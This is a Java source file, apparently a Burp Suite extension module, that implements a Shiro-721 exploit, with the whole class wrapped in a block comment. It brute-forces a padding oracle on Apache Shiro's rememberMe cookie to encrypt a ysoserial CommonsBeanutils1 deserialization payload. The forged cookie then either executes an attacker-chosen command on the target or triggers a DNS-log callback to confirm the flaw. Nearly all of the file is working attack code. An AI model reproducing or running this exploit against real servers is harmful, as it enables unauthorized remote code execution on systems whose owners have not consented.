package burp.attackModule;

import burp.utils.ShiroExpCfg;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import org.apache.commons.codec.DecoderException;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.binary.Hex;
import org.apache.commons.lang3.StringUtils;
import ysoserial.payloads.CommonsBeanutils1;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.PayloadRunner;

import java.io.IOException;
import java.lang.annotation.Target;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import burp.utils.ShiroExpCfg;
/*
public class attackShiro721 extends attackShiro implements Runnable {

    /*
    private final String ValidRememberMe;
    ShiroExpCfg shiroExpCfg = new ShiroExpCfg();

    public attackShiro721() {
    }

    public LinkedList<Integer> getValidIntermediay(String cipherText, String HexrememberMeCookie) {
        String suffix = "";
        String intermediary_str = "";
        LinkedList<Integer> intermediary_list = new LinkedList<Integer>();
        for(int pos=1; pos<=16; pos++){
            String validIV_str = getValidIV(pos, suffix, cipherText, HexrememberMeCookie);
            //LOG(LogType.DEBUG, "pos " + pos + "valid  iv " + validIV_str);
            int tmpIV = Integer.parseInt(validIV_str, 16);
            int intermediary_int = tmpIV ^ pos;
            intermediary_list.addFirst(intermediary_int);
            intermediary_str = String.format("%02X", intermediary_int) + intermediary_str;
            if(pos > 1){
                suffix = "";
                for(int x = intermediary_list.size()-1; x>=0; x--){
                    suffix = String.format("%02X", (pos+1)^intermediary_list.get(x)) + suffix;
                }
            } else{
                suffix = String.format("%02X", (pos+1)^intermediary_int);
            }
        }
        return intermediary_list;
    }

    public String getValidIV(int pos, String suffix, String cipherText, String HexrememberMeCookie) {
        String iv_word = "";
        for (int i = 0; i < 256; i++) {
            iv_word = String.format("%02X", (0xFF & i));
            if(isValidIV(pos, iv_word, suffix, cipherText, HexrememberMeCookie)){
                if(pos == 1){
                    if(isValidIV(2, "01" + iv_word, suffix, cipherText, HexrememberMeCookie)){
                        return iv_word;
                    }
                    else{
                        LOG(LogType.DEBUG, "IV meet unbelievable composition");
                        continue;
                    }
                }
                return iv_word;
            }
        }
        return null;
    }

    public boolean isValidIV(int pos, String iv_word, String suffix, String cipherText, String HexrememberMeCookie){
        String tmp_cookie = HexrememberMeCookie + StringUtils.repeat("0", 32 - pos * 2) + iv_word + suffix + cipherText;

        byte[] bytes = null;
        try {
            bytes = Hex.decodeHex(tmp_cookie.toCharArray());
        } catch (DecoderException e) {
            e.printStackTrace();
        }
        String payload = Base64.encodeBase64String(bytes);
        String respInfo = payloadSend(target_url, payload);
        if (!respInfo.contains("rememberMe=deleteMe")) {
            return true;
        }
        return false;
    }

    private byte[] padding(byte[] payload) {
        int blockSize = (int) Math.ceil(payload.length / 16.0);
        LOG(LogType.DEBUG, "Need to caculate block total " + blockSize);

        int paddingLen = 16 - payload.length % 16;
        int len = payload.length + paddingLen;

        byte[] padding = new byte[paddingLen];
        for (int i = 0; i < paddingLen; i++) {
            padding[i] = (byte) paddingLen;
        }

        byte[] data = new byte[len];
        System.arraycopy(payload, 0, data, 0, payload.length);
        System.arraycopy(padding, 0, data, payload.length, padding.length);
        return data;
    }

    public void PaddingAttack(byte[] yso_payload){
        String HexrememberMeCookie = Hex.encodeHexString(Base64.decodeBase64(ValidRememberMe));
        String base_data = "";
        StringBuilder res = new StringBuilder();

        byte[] data = padding(yso_payload);

        int count = data.length / 16;
        String cipherText = StringUtils.repeat("0", 32);
        res.insert(0, cipherText);
        for(int i = data.length; i > 0; i = i-16){
            LinkedList<Integer> intermediay_list = null;
            byte[] block = new byte[16];
            System.arraycopy(data, i-16, block,0, 16);
            LOG(LogType.DEBUG, "Brute block " + count);
            //LOG(LogType.DEBUG, "cipher data " + cipherText);
            intermediay_list = getValidIntermediay(cipherText, HexrememberMeCookie);
            char[] Array_data = Hex.encodeHexString(block).toCharArray();
            String cipher_block = "";
            for(int h = 0; h < Array_data.length; h=h+2){
                String m = "";
                m = Array_data[h] + Character.toString(Array_data[h+1]);
                String one_cipher = String.format("%02X", Integer.parseInt(m, 16) ^ intermediay_list.pop());
                cipher_block = cipher_block + one_cipher;
            }
            cipherText = cipher_block;
            res.insert(0, cipherText);
            LOG(LogType.DEBUG, "Block " + count +" cipher data: " + cipher_block);
            count--;
        }
        byte[] hex_res = new byte[0];
        try {
            hex_res = Hex.decodeHex(res.toString().toCharArray());
        } catch (DecoderException e) {
            e.printStackTrace();
        }
        String respInfo = payloadSend(target_url, Base64.encodeBase64String(hex_res));
        LOG(LogType.SUCCESS, "Payload rememberMe: " +Base64.encodeBase64String(hex_res));
    }

    @Override
    public void run() {
        /*
        printConfig();
        switch(getModel()){
            case DNSLOG_VERIFY:
                dnslogVerify();
                break;
            case RCE_SILENT:
                commandExcute();
                break;
            default:
                break;
        }
    }

    @Override
    public void dnslogVerify() {
        byte[] yso_payload = null;
        String uuid = UUID.randomUUID().toString().replaceAll("-", "");
        try {
            yso_payload = Base64.decodeBase64(PayloadRunner.run((Class<? extends ObjectPayload<?>>) shiroExpCfg.gadget.get(gadgetClass), "http://" + uuid.substring(0, 5) + "." + command));
        } catch (Exception es) {
            es.printStackTrace();
        }
        PaddingAttack(yso_payload);
    }

    @Override
    public void commandExcute() {
        byte[] yso_payload = null;
        try {
            yso_payload = Base64.decodeBase64(PayloadRunner.run((Class<? extends ObjectPayload<?>>) shiroExpCfg.gadget.get(gadgetClass), command));
        } catch (Exception es) {
            es.printStackTrace();
        }
        PaddingAttack(yso_payload);
    }

    @Override
    public void printConfig() {
        LOG(LogType.CONFIG, "Target URL -> " + targetURL);
        switch (getModel()){
            case DNSLOG_VERIFY:
                LOG(LogType.CONFIG, "Attack Model -> DNS Log");
                break;
            case RCE_SILENT:
                LOG(LogType.CONFIG, "Attack Model -> Remote Code Excute");
                break;
        }
        LOG(LogType.CONFIG, "Valid rememberMeCookie -> " + ValidRememberMe);
        LOG(LogType.CONFIG, "Payload Gadget -> " + gadgetClass);
        LOG(LogType.CONFIG, "CommandLine -> " + command);
    }
}
        */
